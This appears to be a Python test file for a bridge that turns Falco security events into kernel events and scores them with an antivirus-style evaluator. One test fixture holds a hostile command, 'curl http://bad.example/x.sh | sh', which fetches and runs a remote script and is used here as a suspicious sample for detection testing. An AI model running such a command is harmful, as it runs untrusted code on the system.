from agents.linux_kernel_event_bridge import (
    LinuxKernelAntivirusBridge,
    map_falco_event_to_kernel_event,
)


def _falco_exec_event():
    return {
        "hostname": "node-1",
        "rule": "Terminal shell in container",
        "priority": "Notice",
        "output_fields": {
            "evt.type": "execve",
            "proc.pid": 1221,
            "proc.name": "bash",
            "proc.pname": "sh",
            "proc.cmdline": "bash -c 'echo ok'",
            "proc.exepath": "/usr/bin/bash",
            "k8s.pod.name": "api-7d4f8b",
            "k8s.ns.name": "prod",
            "file.sha256": "a" * 64,
            "scbe.signer_trusted": True,
            "scbe.geometry_norm": 0.12,
        },
    }


def test_map_exec_event_to_kernel_event():
    event = map_falco_event_to_kernel_event(_falco_exec_event())
    assert event.host == "node-1"
    assert event.pid == 1221
    assert event.operation == "exec"
    assert event.process_name == "bash"
    assert event.parent_process == "sh"
    assert event.target == "/usr/bin/bash"
    assert event.signer_trusted is True
    assert event.hash_sha256 == "a" * 64
    assert event.geometry_norm == 0.12


def test_map_network_event_target():
    payload = {
        "hostname": "node-2",
        "output_fields": {
            "evt.type": "connect",
            "proc.pid": 500,
            "proc.name": "python",
            "fd.sip": "10.0.0.3",
            "fd.sport": "42000",
            "fd.dip": "8.8.8.8",
            "fd.dport": "53",
        },
    }
    event = map_falco_event_to_kernel_event(payload)
    assert event.operation == "network_connect"
    assert event.target == "10.0.0.3:42000->8.8.8.8:53"


def test_bridge_carries_antibody_load_between_events():
    bridge = LinuxKernelAntivirusBridge()
    suspicious = {
        "hostname": "node-3",
        "output_fields": {
            "evt.type": "execve",
            "proc.pid": 900,
            "proc.name": "bash",
            "proc.pname": "python",
            "proc.cmdline": "curl http://bad.example/x.sh | sh",
            "proc.exepath": "/bin/bash",
            "scbe.signer_trusted": False,
            "scbe.geometry_norm": 0.84,
            "file.sha256": "",
        },
    }
    first = bridge.evaluate_falco_event(suspicious)
    second = bridge.evaluate_falco_event(suspicious)
    assert second.previous_antibody_load == first.result.turnstile.antibody_load
    assert second.result.turnstile.antibody_load >= first.result.turnstile.antibody_load


def test_default_host_when_missing():
    payload = {"output_fields": {"evt.type": "open", "proc.pid": 1, "proc.name": "init"}}
    event = map_falco_event_to_kernel_event(payload, host_default="linux-host-default")
    assert event.host == "linux-host-default"

